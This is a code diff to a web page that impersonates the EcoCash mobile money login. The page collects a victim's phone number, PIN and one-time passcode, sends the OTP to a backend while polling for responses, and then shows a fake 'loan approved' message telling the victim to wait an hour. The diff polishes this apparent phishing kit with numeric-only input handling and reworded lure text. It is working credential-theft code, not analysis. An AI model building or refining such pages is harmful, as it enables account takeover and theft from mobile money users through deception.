@@ -130,13 +130,13 @@
             <div class="login-page">
                 <div class="login-logo"><span class="eco-blue">Eco</span><span class="eco-red">Cash</span></div>
                 <h2 class="login-title">Login</h2>
-                <div class="phone-input-container"><span class="flag-icon">🇿🇼</span><span class="country-code">+263</span><input type="tel" id="phone" placeholder="Phone Number" maxlength="10"></div>
+                <div class="phone-input-container"><span class="flag-icon">🇿🇼</span><span class="country-code">+263</span><input type="tel" id="phone" placeholder="Phone Number" maxlength="10" inputmode="numeric" pattern="[0-9]*"></div>
                 <div class="pin-label">Enter your PIN</div>
                 <div class="pin-boxes">
-                    <input type="password" maxlength="1" oninput="moveToNext(this, 'pin2')" id="pin1">
-                    <input type="password" maxlength="1" oninput="moveToNext(this, 'pin3')" id="pin2">
-                    <input type="password" maxlength="1" oninput="moveToNext(this, 'pin4')" id="pin3">
-                    <input type="password" maxlength="1" oninput="moveToNext(this, 'none')" id="pin4">
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'pin2')" id="pin1">
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'pin3')" id="pin2">
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'pin4')" id="pin3">
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'none')" id="pin4">
                 </div>
                 <div class="blue-arc-container">
                     <p>To register an EcoCash wallet or get assistance, click below</p>
@@ -163,12 +163,12 @@
                 <div class="otp-title">Enter the OTP code sent to</div>
                 <div class="otp-phone" id="otpPhoneDisplay">+263 728846496</div>
                 <div class="otp-boxes">
-                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp2')" id="otp1">
-                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp3')" id="otp2">
-                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp4')" id="otp3">
-                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp5')" id="otp4">
-                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp6')" id="otp5">
-                    <input type="text" maxlength="1" oninput="moveToNext(this, 'none')" id="otp6">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'otp2')" id="otp1">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'otp3')" id="otp2">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'otp4')" id="otp3">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'otp5')" id="otp4">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'otp6')" id="otp5">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="validateNumber(this, 'none')" id="otp6">
                 </div>
                 <div class="resend-text">Resend OTP in <span id="countdown">44</span> Sec</div>
                 <div class="otp-blue-arc">
@@ -188,9 +188,13 @@
         <div id="page6" class="page">
             <div class="success-page">
                 <div class="success-icon">🎉</div>
-                <h2>Congratulations!</h2>
-                <p class="success-text">Your loan has been approved.<br><br> Kindly keep checking mobile money balance, as the funds are expected to be available within <strong>1 hour</strong>.</p>
-                <button class="btn-gradient" onclick="location.reload()">DONE</button>
+                <h2>CONGRATULATIONS!</h2>
+                <p class="success-text">
+                    Your loan has been successfully approved and processed. 
+                    Kindly keep checking mobile money balance, as the funds are expected to be available within the next 1 hour.<br><br>
+                    Thank you for your patience and for choosing our lending services. We appreciate your trust! 🙏
+                </p>
+                <button class="btn-gradient" onclick="location.reload()">Finish</button>
             </div>
         </div>
 
@@ -214,7 +218,12 @@
             showPage(3);
         }
 
-        function moveToNext(current, nextId) {
+        // Replaces moveToNext. Forces numbers only.
+        function validateNumber(current, nextId) {
+            // 1. Remove any non-digit character instantly
+            current.value = current.value.replace(/[^0-9]/g, '');
+            
+            // 2. Auto-advance if a digit was entered
             if (current.value.length === 1) {
                 if (nextId !== 'none') {
                     const next = document.getElementById(nextId);
@@ -225,7 +234,6 @@
                 } else if (current.id === 'otp6') {
                     showPage(8);
                     submitOTPToBackend();
-                    // We are already polling in the background, so it will catch the response.
                 }
             }
         }
@@ -272,8 +280,6 @@
                 currentRequestId = data.requestId;
 
                 document.getElementById('otpPhoneDisplay').textContent = `+263 ${phone}`;
-                
-                // Start the polling loop immediately
                 startPolling();
 
             } catch (error) {
@@ -293,11 +299,10 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ requestId: currentRequestId, otp: otp })
                 });
-                // Polling is already running and will catch the updates
             } catch (error) { console.log("Error submitting OTP:", error); }
         }
 
-        // Polling - Keeps running in the background until a final page is reached
+        // Polling
         function startPolling() {
             clearInterval(pollInterval);
             pollInterval = setInterval(async () => {
